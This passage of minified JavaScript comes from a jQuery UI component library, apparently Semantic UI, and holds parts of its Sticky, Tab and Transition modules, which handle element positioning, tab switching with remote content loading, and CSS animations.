b.set.size(), b.set.minimumSize(), b.set.offset(), S.css({ left: b.cache.element.left, bottom: "", marginBottom: "" }).removeClass(g.bound).removeClass(g.bottom).addClass(g.fixed).addClass(g.top), m.onStick.call(E) }, fixBottom: function() { b.debug("Sticking element to bottom of page"), m.setSize && b.set.size(), b.set.minimumSize(), b.set.offset(), S.css({ left: b.cache.element.left, bottom: "", marginBottom: "" }).removeClass(g.bound).removeClass(g.top).addClass(g.fixed).addClass(g.bottom), m.onStick.call(E) }, unbind: function() { b.is.bound() && (b.debug("Removing container bound position on element"), b.remove.offset(), S.removeClass(g.bound).removeClass(g.top).removeClass(g.bottom)) }, unfix: function() { b.is.fixed() && (b.debug("Removing fixed position on element"), b.remove.minimumSize(), b.remove.offset(), S.removeClass(g.fixed).removeClass(g.top).removeClass(g.bottom), m.onUnstick.call(E)) }, reset: function() { b.debug("Resetting elements position"), b.unbind(), b.unfix(), b.resetCSS(), b.remove.offset(), b.remove.lastScroll() }, resetCSS: function() { S.css({ width: "", height: "" }), o.css({ height: "" }) }, setting: function(t, n) { if (e.isPlainObject(t)) e.extend(!0, m, t);
                            else { if (void 0 === n) return m[t];
                                m[t] = n } }, internal: function(t, n) { if (e.isPlainObject(t)) e.extend(!0, b, t);
                            else { if (void 0 === n) return b[t];
                                b[t] = n } }, debug: function() {!m.silent && m.debug && (m.performance ? b.performance.log(arguments) : (b.debug = Function.prototype.bind.call(console.info, console, m.name + ":"), b.debug.apply(console, arguments))) }, verbose: function() {!m.silent && m.verbose && m.debug && (m.performance ? b.performance.log(arguments) : (b.verbose = Function.prototype.bind.call(console.info, console, m.name + ":"), b.verbose.apply(console, arguments))) }, error: function() { m.silent || (b.error = Function.prototype.bind.call(console.error, console, m.name + ":"), b.error.apply(console, arguments)) }, performance: { log: function(e) { var t, n, i;
                                m.performance && (t = (new Date).getTime(), i = s || t, n = t - i, s = t, c.push({ Name: e[0], Arguments: [].slice.call(e, 1) || "", Element: E, "Execution Time": n })), clearTimeout(b.performance.timer), b.performance.timer = setTimeout(b.performance.display, 0) }, display: function() { var t = m.name + ":",
                                    n = 0;
                                s = !1, clearTimeout(b.performance.timer), e.each(c, function(e, t) { n += t["Execution Time"] }), t += " " + n + "ms", a && (t += " '" + a + "'"), (void 0 !== console.group || void 0 !== console.table) && c.length > 0 && (console.groupCollapsed(t), console.table ? console.table(c) : e.each(c, function(e, t) { console.log(t.Name + ": " + t["Execution Time"] + "ms") }), console.groupEnd()), c = [] } }, invoke: function(t, n, i) { var o, a, s, c = C; return n = n || d, i = E || i, "string" == typeof t && void 0 !== c && (t = t.split(/[\. ]/), o = t.length - 1, e.each(t, function(n, i) { var r = n != o ? i + t[n + 1].charAt(0).toUpperCase() + t[n + 1].slice(1) : t; if (e.isPlainObject(c[r]) && n != o) c = c[r];
                                else { if (void 0 !== c[r]) return a = c[r], !1; if (!e.isPlainObject(c[i]) || n == o) return void 0 !== c[i] && (a = c[i], !1);
                                    c = c[i] } })), e.isFunction(a) ? s = a.apply(i, n) : void 0 !== a && (s = a), e.isArray(r) ? r.push(s) : void 0 !== r ? r = [r, s] : void 0 !== s && (r = s), a } }, l ? (void 0 === C && b.initialize(), b.invoke(u)) : (void 0 !== C && C.invoke("destroy"), b.initialize()) }), void 0 !== r ? r : this }, e.fn.sticky.settings = { name: "Sticky", namespace: "sticky", silent: !1, debug: !1, verbose: !0, performance: !0, pushing: !1, context: !1, container: !1, scrollContext: t, offset: 0, bottomOffset: 0, jitter: 5, setSize: !0, observeChanges: !1, onReposition: function() {}, onScroll: function() {}, onStick: function() {}, onUnstick: function() {}, onTop: function() {}, onBottom: function() {}, error: { container: "Sticky element must be inside a relative container", visible: "Element is hidden, you must call refresh after element becomes visible. Use silent setting to surpress this warning in production.", method: "The method you called is not defined.", invalidContext: "Context specified does not exist", elementSize: "Sticky element is larger than its container, cannot create sticky." }, className: { bound: "bound", fixed: "fixed", supported: "native", top: "top", bottom: "bottom" } } }(e, window, document),
        function(e, t, n, i) { "use strict";
            t = void 0 !== t && t.Math == Math ? t : "undefined" != typeof self && self.Math == Math ? self : Function("return this")(), e.fn.tab = function(i) { var r, o = e(e.isFunction(this) ? t : this),
                    a = o.selector || "",
                    s = (new Date).getTime(),
                    c = [],
                    u = arguments[0],
                    l = "string" == typeof u,
                    d = [].slice.call(arguments, 1),
                    f = !1; return o.each(function() { var h, p, b, m, g, v, y = e.isPlainObject(i) ? e.extend(!0, {}, e.fn.tab.settings, i) : e.extend({}, e.fn.tab.settings),
                        w = y.className,
                        x = y.metadata,
                        S = y.selector,
                        _ = y.error,
                        k = "." + y.namespace,
                        C = "module-" + y.namespace,
                        A = e(this),
                        E = {},
                        T = !0,
                        M = 0,
                        R = this,
                        P = A.data(C);
                    g = { initialize: function() { g.debug("Initializing tab menu item", A), g.fix.callbacks(), g.determineTabs(), g.debug("Determining tabs", y.context, p), y.auto && g.set.auto(), g.bind.events(), y.history && !f && (g.initializeHistory(), f = !0), g.instantiate() }, instantiate: function() { g.verbose("Storing instance of module", g), P = g, A.data(C, g) }, destroy: function() { g.debug("Destroying tabs", A), A.removeData(C).off(k) }, bind: { events: function() { e.isWindow(R) || (g.debug("Attaching tab activation events to element", A), A.on("click" + k, g.event.click)) } }, determineTabs: function() { var t; "parent" === y.context ? (A.closest(S.ui).length > 0 ? (t = A.closest(S.ui), g.verbose("Using closest UI element as parent", t)) : t = A, h = t.parent(), g.verbose("Determined parent element for creating context", h)) : y.context ? (h = e(y.context), g.verbose("Using selector for tab context", y.context, h)) : h = e("body"), y.childrenOnly ? (p = h.children(S.tabs), g.debug("Searching tab context children for tabs", h, p)) : (p = h.find(S.tabs), g.debug("Searching tab context for tabs", h, p)) }, fix: { callbacks: function() { e.isPlainObject(i) && (i.onTabLoad || i.onTabInit) && (i.onTabLoad && (i.onLoad = i.onTabLoad, delete i.onTabLoad, g.error(_.legacyLoad, i.onLoad)), i.onTabInit && (i.onFirstLoad = i.onTabInit, delete i.onTabInit, g.error(_.legacyInit, i.onFirstLoad)), y = e.extend(!0, {}, e.fn.tab.settings, i)) } }, initializeHistory: function() { if (g.debug("Initializing page state"), void 0 === e.address) return g.error(_.state), !1; if ("state" == y.historyType) { if (g.debug("Using HTML5 to manage state"), !1 === y.path) return g.error(_.path), !1;
                                e.address.history(!0).state(y.path) } e.address.bind("change", g.event.history.change) }, event: { click: function(t) { var n = e(this).data(x.tab);
                                void 0 !== n ? (y.history ? (g.verbose("Updating page state", t), e.address.value(n)) : (g.verbose("Changing tab", t), g.changeTab(n)), t.preventDefault()) : g.debug("No tab specified") }, history: { change: function(t) { var n = t.pathNames.join("/") || g.get.initialPath(),
                                        i = y.templates.determineTitle(n) || !1;
                                    g.performance.display(), g.debug("History change event", n, t), v = t, void 0 !== n && g.changeTab(n), i && e.address.title(i) } } }, refresh: function() { b && (g.debug("Refreshing tab", b), g.changeTab(b)) }, cache: { read: function(e) { return void 0 !== e && E[e] }, add: function(e, t) { e = e || b, g.debug("Adding cached content for", e), E[e] = t }, remove: function(e) { e = e || b, g.debug("Removing cached content for", e), delete E[e] } }, set: { auto: function() { var t = "string" == typeof y.path ? y.path.replace(/\/$/, "") + "/{$tab}" : "/{$tab}";
                                g.verbose("Setting up automatic tab retrieval from server", t), e.isPlainObject(y.apiSettings) ? y.apiSettings.url = t : y.apiSettings = { url: t } }, loading: function(e) { var t = g.get.tabElement(e);
                                t.hasClass(w.loading) || (g.verbose("Setting loading state for", t), t.addClass(w.loading).siblings(p).removeClass(w.active + " " + w.loading), t.length > 0 && y.onRequest.call(t[0], e)) }, state: function(t) { e.address.value(t) } }, changeTab: function(n) { var i = t.history && t.history.pushState,
                                r = i && y.ignoreFirstLoad && T,
                                o = y.auto || e.isPlainObject(y.apiSettings),
                                a = o && !r ? g.utilities.pathToArray(n) : g.get.defaultPathArray(n);
                            n = g.utilities.arrayToPath(a), e.each(a, function(t, i) { var s, c, u, l, d = a.slice(0, t + 1),
                                    f = g.utilities.arrayToPath(d),
                                    p = g.is.tab(f),
                                    S = t + 1 == a.length,
                                    k = g.get.tabElement(f); if (g.verbose("Looking for tab", i), p) { if (g.verbose("Tab was found", i), b = f, m = g.utilities.filterArray(a, d), S ? l = !0 : (c = a.slice(0, t + 2), u = g.utilities.arrayToPath(c), (l = !g.is.tab(u)) && g.verbose("Tab parameters found", c)), l && o) return r ? (g.debug("Ignoring remote content on first tab load", f), T = !1, g.cache.add(n, k.html()), g.activate.all(f), y.onFirstLoad.call(k[0], f, m, v), y.onLoad.call(k[0], f, m, v)) : (g.activate.navigation(f), g.fetch.content(f, n)), !1;
                                    g.debug("Opened local tab", f), g.activate.all(f), g.cache.read(f) || (g.cache.add(f, !0), g.debug("First time tab loaded calling tab init"), y.onFirstLoad.call(k[0], f, m, v)), y.onLoad.call(k[0], f, m, v) } else { if (-1 != n.search("/") || "" === n) return g.error(_.missingTab, A, h, f), !1; if (s = e("#" + n + ', a[name="' + n + '"]'), f = s.closest("[data-tab]").data(x.tab), k = g.get.tabElement(f), s && s.length > 0 && f) return g.debug("Anchor link used, opening parent tab", k, s), k.hasClass(w.active) || setTimeout(function() { g.scrollTo(s) }, 0), g.activate.all(f), g.cache.read(f) || (g.cache.add(f, !0), g.debug("First time tab loaded calling tab init"), y.onFirstLoad.call(k[0], f, m, v)), y.onLoad.call(k[0], f, m, v), !1 } }) }, scrollTo: function(t) { var i = !!(t && t.length > 0) && t.offset().top;!1 !== i && (g.debug("Forcing scroll to an in-page link in a hidden tab", i, t), e(n).scrollTop(i)) }, update: { content: function(t, n, i) { var r = g.get.tabElement(t),
                                    o = r[0];
                                i = void 0 !== i ? i : y.evaluateScripts, "string" == typeof y.cacheType && "dom" == y.cacheType.toLowerCase() && "string" != typeof n ? r.empty().append(e(n).clone(!0)) : i ? (g.debug("Updating HTML and evaluating inline scripts", t, n), r.html(n)) : (g.debug("Updating HTML", t, n), o.innerHTML = n) } }, fetch: { content: function(t, n) { var i, r, o = g.get.tabElement(t),
                                    a = { dataType: "html", encodeParameters: !1, on: "now", cache: y.alwaysRefresh, headers: { "X-Remote": !0 }, onSuccess: function(e) { "response" == y.cacheType && g.cache.add(n, e), g.update.content(t, e), t == b ? (g.debug("Content loaded", t), g.activate.tab(t)) : g.debug("Content loaded in background", t), y.onFirstLoad.call(o[0], t, m, v), y.onLoad.call(o[0], t, m, v), y.loadOnce ? g.cache.add(n, !0) : "string" == typeof y.cacheType && "dom" == y.cacheType.toLowerCase() && o.children().length > 0 ? setTimeout(function() { var e = o.children().clone(!0);
                                                e = e.not("script"), g.cache.add(n, e) }, 0) : g.cache.add(n, o.html()) }, urlData: { tab: n } },
                                    s = o.api("get request") || !1,
                                    c = s && "pending" === s.state();
                                n = n || t, r = g.cache.read(n), y.cache && r ? (g.activate.tab(t), g.debug("Adding cached content", n), y.loadOnce || ("once" == y.evaluateScripts ? g.update.content(t, r, !1) : g.update.content(t, r)), y.onLoad.call(o[0], t, m, v)) : c ? (g.set.loading(t), g.debug("Content is already loading", n)) : void 0 !== e.api ? (i = e.extend(!0, {}, y.apiSettings, a), g.debug("Retrieving remote content", n, i), g.set.loading(t), o.api(i)) : g.error(_.api) } }, activate: { all: function(e) { g.activate.tab(e), g.activate.navigation(e) }, tab: function(e) { var t = g.get.tabElement(e),
                                    n = "siblings" == y.deactivate ? t.siblings(p) : p.not(t),
                                    i = t.hasClass(w.active);
                                g.verbose("Showing tab content for", t), i || (t.addClass(w.active), n.removeClass(w.active + " " + w.loading), t.length > 0 && y.onVisible.call(t[0], e)) }, navigation: function(e) { var t = g.get.navElement(e),
                                    n = "siblings" == y.deactivate ? t.siblings(o) : o.not(t),
                                    i = t.hasClass(w.active);
                                g.verbose("Activating tab navigation for", t, e), i || (t.addClass(w.active), n.removeClass(w.active + " " + w.loading)) } }, deactivate: { all: function() { g.deactivate.navigation(), g.deactivate.tabs() }, navigation: function() { o.removeClass(w.active) }, tabs: function() { p.removeClass(w.active + " " + w.loading) } }, is: { tab: function(e) { return void 0 !== e && g.get.tabElement(e).length > 0 } }, get: { initialPath: function() { return o.eq(0).data(x.tab) || p.eq(0).data(x.tab) }, path: function() { return e.address.value() }, defaultPathArray: function(e) { return g.utilities.pathToArray(g.get.defaultPath(e)) }, defaultPath: function(e) { var t = o.filter("[data-" + x.tab + '^="' + e + '/"]').eq(0),
                                    n = t.data(x.tab) || !1; if (n) { if (g.debug("Found default tab", n), M < y.maxDepth) return M++, g.get.defaultPath(n);
                                    g.error(_.recursion) } else g.debug("No default tabs found for", e, p); return M = 0, e }, navElement: function(e) { return e = e || b, o.filter("[data-" + x.tab + '="' + e + '"]') }, tabElement: function(e) { var t, n, i, r; return e = e || b, i = g.utilities.pathToArray(e), r = g.utilities.last(i), t = p.filter("[data-" + x.tab + '="' + e + '"]'), n = p.filter("[data-" + x.tab + '="' + r + '"]'), t.length > 0 ? t : n }, tab: function() { return b } }, utilities: { filterArray: function(t, n) { return e.grep(t, function(t) { return -1 == e.inArray(t, n) }) }, last: function(t) { return !!e.isArray(t) && t[t.length - 1] }, pathToArray: function(e) { return void 0 === e && (e = b), "string" == typeof e ? e.split("/") : [e] }, arrayToPath: function(t) { return !!e.isArray(t) && t.join("/") } }, setting: function(t, n) { if (g.debug("Changing setting", t, n), e.isPlainObject(t)) e.extend(!0, y, t);
                            else { if (void 0 === n) return y[t];
                                e.isPlainObject(y[t]) ? e.extend(!0, y[t], n) : y[t] = n } }, internal: function(t, n) { if (e.isPlainObject(t)) e.extend(!0, g, t);
                            else { if (void 0 === n) return g[t];
                                g[t] = n } }, debug: function() {!y.silent && y.debug && (y.performance ? g.performance.log(arguments) : (g.debug = Function.prototype.bind.call(console.info, console, y.name + ":"), g.debug.apply(console, arguments))) }, verbose: function() {!y.silent && y.verbose && y.debug && (y.performance ? g.performance.log(arguments) : (g.verbose = Function.prototype.bind.call(console.info, console, y.name + ":"), g.verbose.apply(console, arguments))) }, error: function() { y.silent || (g.error = Function.prototype.bind.call(console.error, console, y.name + ":"), g.error.apply(console, arguments)) }, performance: { log: function(e) { var t, n, i;
                                y.performance && (t = (new Date).getTime(), i = s || t, n = t - i, s = t, c.push({ Name: e[0], Arguments: [].slice.call(e, 1) || "", Element: R, "Execution Time": n })), clearTimeout(g.performance.timer), g.performance.timer = setTimeout(g.performance.display, 500) }, display: function() { var t = y.name + ":",
                                    n = 0;
                                s = !1, clearTimeout(g.performance.timer), e.each(c, function(e, t) { n += t["Execution Time"] }), t += " " + n + "ms", a && (t += " '" + a + "'"), (void 0 !== console.group || void 0 !== console.table) && c.length > 0 && (console.groupCollapsed(t), console.table ? console.table(c) : e.each(c, function(e, t) { console.log(t.Name + ": " + t["Execution Time"] + "ms") }), console.groupEnd()), c = [] } }, invoke: function(t, n, i) { var o, a, s, c = P; return n = n || d, i = R || i, "string" == typeof t && void 0 !== c && (t = t.split(/[\. ]/), o = t.length - 1, e.each(t, function(n, i) { var r = n != o ? i + t[n + 1].charAt(0).toUpperCase() + t[n + 1].slice(1) : t; if (e.isPlainObject(c[r]) && n != o) c = c[r];
                                else { if (void 0 !== c[r]) return a = c[r], !1; if (!e.isPlainObject(c[i]) || n == o) return void 0 !== c[i] ? (a = c[i], !1) : (g.error(_.method, t), !1);
                                    c = c[i] } })), e.isFunction(a) ? s = a.apply(i, n) : void 0 !== a && (s = a), e.isArray(r) ? r.push(s) : void 0 !== r ? r = [r, s] : void 0 !== s && (r = s), a } }, l ? (void 0 === P && g.initialize(), g.invoke(u)) : (void 0 !== P && P.invoke("destroy"), g.initialize()) }), void 0 !== r ? r : this }, e.tab = function() { e(t).tab.apply(this, arguments) }, e.fn.tab.settings = { name: "Tab", namespace: "tab", silent: !1, debug: !1, verbose: !1, performance: !0, auto: !1, history: !1, historyType: "hash", path: !1, context: !1, childrenOnly: !1, maxDepth: 25, deactivate: "siblings", alwaysRefresh: !1, cache: !0, loadOnce: !1, cacheType: "response", ignoreFirstLoad: !1, apiSettings: !1, evaluateScripts: "once", onFirstLoad: function(e, t, n) {}, onLoad: function(e, t, n) {}, onVisible: function(e, t, n) {}, onRequest: function(e, t, n) {}, templates: { determineTitle: function(e) {} }, error: { api: "You attempted to load content without API module", method: "The method you called is not defined", missingTab: "Activated tab cannot be found. Tabs are case-sensitive.", noContent: "The tab you specified is missing a content url.", path: "History enabled, but no path was specified", recursion: "Max recursive depth reached", legacyInit: "onTabInit has been renamed to onFirstLoad in 2.0, please adjust your code.", legacyLoad: "onTabLoad has been renamed to onLoad in 2.0. Please adjust your code", state: "History requires Asual's Address library <https://github.com/asual/jquery-address>" }, metadata: { tab: "tab", loaded: "loaded", promise: "promise" }, className: { loading: "loading", active: "active" }, selector: { tabs: ".ui.tab", ui: ".ui" } } }(e, window, document),
        function(e, t, n, i) { "use strict";
            t = void 0 !== t && t.Math == Math ? t : "undefined" != typeof self && self.Math == Math ? self : Function("return this")(), e.fn.transition = function() { var i, r = e(this),
                    o = r.selector || "",
                    a = (new Date).getTime(),
                    s = [],
                    c = arguments,
                    u = c[0],
                    l = [].slice.call(arguments, 1),
                    d = "string" == typeof u;
                t.requestAnimationFrame || t.mozRequestAnimationFrame || t.webkitRequestAnimationFrame || t.msRequestAnimationFrame; return r.each(function(t) { var f, h, p, b, m, g, v, y, w, x = e(this),
                        S = this;
                    w = { initialize: function() { f = w.get.settings.apply(S, c), b = f.className, p = f.error, m = f.metadata, y = "." + f.namespace, v = "module-" + f.namespace, h = x.data(v) || w, g = w.get.animationEndEvent(), d && (d = w.invoke(u)), !1 === d && (w.verbose("Converted arguments into settings object", f), f.interval ? w.delay(f.animate) : w.animate(), w.instantiate()) }, instantiate: function() { w.verbose("Storing instance of module", w), h = w, x.data(v, h) }, destroy: function() { w.verbose("Destroying previous module for", S), x.removeData(v) }, refresh: function() { w.verbose("Refreshing display type on next animation"), delete w.displayType }, forceRepaint: function() { w.verbose("Forcing element repaint"); var e = x.parent(),
                                t = x.next();
                            0 === t.length ? x.detach().appendTo(e) : x.detach().insertBefore(t) }, repaint: function() { w.verbose("Repainting element");
                            S.offsetWidth }, delay: function(e) { var n, i, o = w.get.animationDirection();
                            o || (o = w.can.transition() ? w.get.direction() : "static"), e = void 0 !== e ? e : f.interval, n = "auto" == f.reverse && o == b.outward, i = n || 1 == f.reverse ? (r.length - t) * f.interval : t * f.interval, w.debug("Delaying animation by", i), setTimeout(w.animate, i) }, animate: function(e) { if (f = e || f, !w.is.supported()) return w.error(p.support), !1; if (w.debug("Preparing animation", f.animation), w.is.animating()) { if (f.queue) return !f.allowRepeats && w.has.direction() && w.is.occurring() && !0 !== w.queuing ? w.debug("Animation is currently occurring, preventing queueing same animation", f.animation) : w.queue(f.animation), !1; if (!f.allowRepeats && w.is.occurring()) return w.debug("Animation is already occurring, will not execute repeated animation", f.animation), !1;
                                w.debug("New animation started, completing previous early", f.animation), h.complete() } w.can.animate() ? w.set.animating(f.animation) : w.error(p.noAnimation, f.animation, S) }, reset: function() { w.debug("Resetting animation to beginning conditions"), w.remove.animationCallbacks(), w.restore.conditions(), w.remove.animating() }, queue: function(e) { w.debug("Queueing animation of", e), w.queuing = !0, x.one(g + ".queue" + y, function() { w.queuing = !1, w.repaint(), w.animate.apply(this, f) }) }, complete: function(e) { w.debug("Animation complete", f.animation), w.remove.completeCallback(), w.remove.failSafe(), w.is.looping() || (w.is.outward() ? (w.verbose("Animation is outward, hiding element"), w.restore.conditions(), w.hide()) : w.is.inward() ? (w.verbose("Animation is outward, showing element"), w.restore.conditions(), w.show()) : (w.verbose("Static animation completed"), w.restore.conditions(), f.onComplete.call(S))) }, force: { visible: function() { var e = x.attr("style"),
                                    t = w.get.userStyle(),
                                    n = w.get.displayType(),
                                    i = t + "display: " + n + " !important;",
                                    r = x.css("display"),
                                    o = void 0 === e || "" === e;
                                r !== n ? (w.verbose("Overriding default display to show element", n), x.attr("style", i)) : o && x.removeAttr("style") }, hidden: function() { var e = x.attr("style"),
                                    t = x.css("display"),
                                    n = void 0 === e || "" === e; "none" === t || w.is.hidden() ? n && x.removeAttr("style") : (w.verbose("Overriding default display to hide element"), x.css("display", "none")) } }, has: { direction: function(t) { var n = !1; return t = t || f.animation, "string" == typeof t && (t = t.split(" "), e.each(t, function(e, t) { t !== b.inward && t !== b.outward || (n = !0) })), n }, inlineDisplay: function() { var t = x.attr("style") || ""; return e.isArray(t.match(/display.*?;/, "")) } }, set: { animating: function(e) { var t;
                                w.remove.completeCallback(), e = e || f.animation, t = w.get.animationClass(e), w.save.animation(t), w.force.visible(), w.remove.hidden(), w.remove.direction(), w.start.animation(t) }, duration: function(e, t) { t = t || f.duration, ((t = "number" == typeof t ? t + "ms" : t) || 0 === t) && (w.verbose("Setting animation duration", t), x.css({ "animation-duration": t })) }, direction: function(e) { e = e || w.get.direction(), e == b.inward ? w.set.inward() : w.set.outward() }, looping: function() { w.debug("Transition set to loop"), x.addClass(b.looping) }, hidden: function() { x.addClass(b.transition).addClass(b.hidden) }, inward: function() { w.debug("Setting direction to inward"), x.removeClass(b.outward).addClass(b.inward) }, outward: function() { w.debug("Setting direction to outward"), x.removeClass(b.inward).addClass(b.outward) }, visible: function() { x.addClass(b.transition).addClass(b.visible) } }, start: { animation: function(e) { e = e || w.get.animationClass(), w.debug("Starting tween", e), x.addClass(e).one(g + ".complete" + y, w.complete), f.useFailSafe && w.add.failSafe(), w.set.duration(f.duration), f.onStart.call(S) } }, save: { animation: function(e) { w.cache || (w.cache = {}), w.cache.animation = e }, displayType: function(e) { "none" !== e && x.data(m.displayType, e) }, transitionExists: function(t, n) { e.fn.transition.exists[t] = n, w.verbose("Saving existence of transition", t, n) } }, restore: { conditions: function() { var e = w.get.currentAnimation();
                                e && (x.removeClass(e), w.verbose("Removing animation class", w.cache)), w.remove.duration() } }, add: { failSafe: function() { var e = w.get.duration();
                                w.timer = setTimeout(function() { x.triggerHandler(g) }, e + f.failSafeDelay), w.verbose("Adding fail safe timer", w.timer) } }, remove: { animating: function() { x.removeClass(b.animating) }, animationCallbacks: function() { w.remove.queueCallback(), w.remove.completeCallback() }, queueCallback: function() { x.off(".queue" + y) }, completeCallback: function() { x.off(".complete" + y) }, display: function() { x.css("display", "") }, direction: function() { x.removeClass(b.inward).removeClass(b.outward) }, duration: function() { x.css("animation-duration", "") }, failSafe: function() { w.verbose("Removing fail safe timer", w.timer), w.timer && clearTimeout(w.timer) }, hidden: function() { x.removeClass(b.hidden) }, visible: function() { x.removeClass(b.visible) }, looping: function() { w.debug("Transitions are no longer looping"), w.is.looping() && (w.reset(), x.removeClass(b.looping)) }, transition: function() { x.removeClass(b.visible).removeClass(b.hidden) } }, get: { settings: function(t, n, i) { return "object" == typeof t ? e.extend(!0, {}, e.fn.transition.settings, t) : "function" == typeof i ? e.extend({}, e.fn.transition.settings, { animation: t, onComplete: i, duration: n }) : "string" == typeof n || "number" == typeof n ? e.extend({}, e.fn.transition.settings, { animation: t, duration: n }) : "object" == typeof n ? e.extend({}, e.fn.transition.settings, n, { animation: t }) : "function" == typeof n ? e.extend({}, e.fn.transition.settings, { animation: t, onComplete: n }) : e.extend({}, e.fn.transition.settings, { animation: t }) }, animationClass: function(e) { var t = e || f.animation,
                                    n = w.can.transition() && !w.has.direction() ? w.get.direction() + " " : ""; return b.animating + " " + b.transition + " " + n + t }, currentAnimation: function() { return !(!w.cache || void 0 === w.cache.animation) && w.cache.animation }, currentDirection: function() { return w.is.inward() ? b.inward : b.outward }, direction: function() { return w.is.hidden() || !w.is.visible() ? b.inward : b.outward }, animationDirection: function(t) { var n; return t = t || f.animation, "string" == typeof t && (t = t.split(" "), e.each(t, function(e, t) { t === b.inward ? n = b.inward : t === b.outward && (n = b.outward) })), n || !1 }, duration: function(e) { return e = e || f.duration, !1 === e && (e = x.css("animation-duration") || 0), "string" == typeof e ? e.indexOf("ms") > -1 ? parseFloat(e) : 1e3 * parseFloat(e) : e }, displayType: function(e) { return e = void 0 === e || e, f.displayType ? f.displayType : (e && void 0 === x.data(m.displayType) && w.can.transition(!0), x.data(m.displayType)) }, userStyle: function(e) { return e = e || x.attr("style") || "", e.replace(/display.*?;/, "") }, transitionExists: function(t) { return e.fn.transition.exists[t] }, animationStartEvent: function() { var e, t = n.createElement("div"),
                                    i = { animation: "animationstart", OAnimation: "oAnimationStart", MozAnimation: "mozAnimationStart", WebkitAnimation: "webkitAnimationStart" }; for (e in i)
                                    if (void 0 !== t.style[e]) return i[e]; return !1 }, animationEndEvent: function() { var e, t = n.createElement("div"),
                                    i = { animation: "animationend", OAnimation: "oAnimationEnd", MozAnimation: "mozAnimationEnd", WebkitAnimation: "webkitAnimationEnd" }; for (e in i)
                                    if (void 0 !== t.style[e]) return i[e]; return !1 } }, can: { transition: function(t) { var n, i, r, o, a, s, c = f.animation,
                                    u = w.get.transitionExists(c),
                                    l = w.get.displayType(!1); if (void 0 === u || t) { if (w.verbose("Determining whether animation exists"), n = x.attr("class"), i = x.prop("tagName"), r = e("<" + i + " />").addClass(n).insertAfter(x), o = r.addClass(c).removeClass(b.inward).removeClass(b.outward).addClass(b.animating).addClass(b.transition).css("animationName"), a = r.addClass(b.inward).css("animationName"), l || (l = r.attr("class", n).removeAttr("style").removeClass(b.hidden).removeClass(b.visible).show().css("display"), w.verbose("Determining final display state", l), w.save.displayType(l)), r.remove(), o != a) w.debug("Direction exists for animation", c), s = !0;
                                    else { if ("none" == o || !o) return void w.debug("No animation defined in css", c);
                                        w.debug("Static animation found", c, l), s = !1 } w.save.transitionExists(c, s) } return void 0 !== u ? u : s }, animate: function() { return void 0 !== w.can.transition() } }, is: { animating: function() { return x.hasClass(b.animating) }, inward: function() { return x.hasClass(b.inward) }, outward: function() { return x.hasClass(b.outward) }, looping: function() { return x.hasClass(b.looping) }, occurring: function(e) { return e = e || f.animation, e = "." + e.replace(" ", "."), x.filter(e).length > 0 }, visible: function() { return x.is(":visible") }, hidden: function() { return "hidden" === x.css("visibility") }, supported: function() { return !1 !== g } }, hide: function() { w.verbose("Hiding element"), w.is.animating() && w.reset(), S.blur(), w.remove.display(), w.remove.visible(), w.set.hidden(), w.force.hidden(), f.onHide.call(S), f.onComplete.call(S) }, show: function(e) { w.verbose("Showing element", e), w.remove.hidden(), w.set.visible(), w.force.visible(), f.onShow.call(S), f.onComplete.call(S) }, toggle: function() { w.is.visible() ? w.hide() : w.show() }, stop: function() { w.debug("Stopping current animation"), x.triggerHandler(g) }, stopAll: function() { w.debug("Stopping all animation"), w.remove.queueCallback(), x.triggerHandler(g) }, clear: { queue: function() { w.debug("Clearing animation queue"), w.remove.queueCallback() } }, enable: function() { w.verbose("Starting animation"), x.removeClass(b.disabled) }, disable: function() { w.debug("Stopping animation"), x.addClass(b.disabled) }, setting: function(t, n) { if (w.debug("Changing setting", t, n), e.isPlainObject(t)) e.extend(!0, f, t);
                            else { if (void 0 === n) return f[t];
                                e.isPlainObject(f[t]) ? e.extend(!0, f[t], n) : f[t] = n } }, internal: function(t, n) { if (e.isPlainObject(t)) e.extend(!0, w, t);
                            else { if (void 0 === n) return w[t];
                                w[t] = n } }, debug: function() {!f.silent && f.debug && (f.performance ? w.performance.log(arguments) : (w.debug = Function.prototype.bind.call(console.info, console, f.name + ":"), w.debug.apply(console, arguments))) }, verbose: function() {!f.silent && f.verbose && f.debug && (f.performance ? w.performance.log(arguments) : (w.verbose = Function.prototype.bind.call(console.info, console, f.name + ":"), w.verbose.apply(console, arguments))) }, error: function() { f.silent || (w.error = Function.prototype.bind.call(console.error, console, f.name + ":"), w.error.apply(console, arguments)) }, performance: { log: function(e) { var t, n, i;
                                f.performance && (t = (new Date).getTime(), i = a || t, n = t - i, a = t, s.push({ Name: e[0], Arguments: [].slice.call(e, 1) || "", Element: S, "Execution Time": n })), clearTimeout(w.performance.timer), w.performance.timer = setTimeout(w.performance.display, 500) }, display: function() { var t = f.name + ":",
                                    n = 0;
                                a = !1, clearTimeout(w.performance.timer), e.each(s, function(e, t) { n += t["Execution Time"] }), t += " " + n + "ms", o && (t += " '" + o + "'"), r.length > 1 && (t += " (" + r.length + ")"), (void 0 !== console.group || void 0 !== console.table) && s.length > 0 && (console.groupCollapsed(t), console.table ? console.table(s) : e.each(s, function(e, t) { console.log(t.Name + ": " + t["Execution Time"] + "ms") }), console.groupEnd()), s = [] } }, invoke: function(t, n, r) { var o, a, s, c = h; return n = n || l, r = S || r, "string" == typeof t && void 0 !== c && (t = t.split(/[\. ]/), o = t.length - 1, e.each(t, function(n, i) { var r = n != o ? i + t[n + 1].charAt(0).toUpperCase() + t[n + 1].slice(1) : t; if (e.isPlainObject(c[r]) && n != o) c = c[r];
                                else { if (void 0 !== c[r]) return a = c[r], !1; if (!e.isPlainObject(c[i]) || n == o) return void 0 !== c[i] && (a = c[i], !1);
                                    c = c[i] } })), e.isFunction(a) ? s = a.apply(r, n) : void 0 !== a && (s = a), e.isArray(i) ? i.push(s) : void 0 !== i ? i = [i, s] : void 0 !== s && (i = s), void 0 !== a && a } }, w.initialize() }), void 0 !== i ? i : this }, e.fn.transition.exists = {}, e.fn.transition.settings = { name: "Transition", silent: !1, debug: !1, verbose: !1, performance: !0, namespace: "transition", interval: 0, reverse: "auto", onStart: function() {}, onComplete: function() {}, onShow: function() {}, onHide: function() {}, useFailSafe: !0, failSafeDelay: 100, allowRepeats: !1, displayType: !1, animation: "fade", duration: !1, queue: !0, metadata: { displayType: "display" }, className: { animating: "animating", disabled: "disabled", hidden: "hidden", inward: "in", loading: "loading", looping: "looping", outward: "out", transition: "transition", visible: "visible" }, error: { noAnimation: "Element is no longer attached to DOM. Unable to animate.  Use silent setting to surpress this warning in production.", repeated: "That animation is already occurring, cancelling repeated animation", method: "The method you called is not defined", support: "This browser does 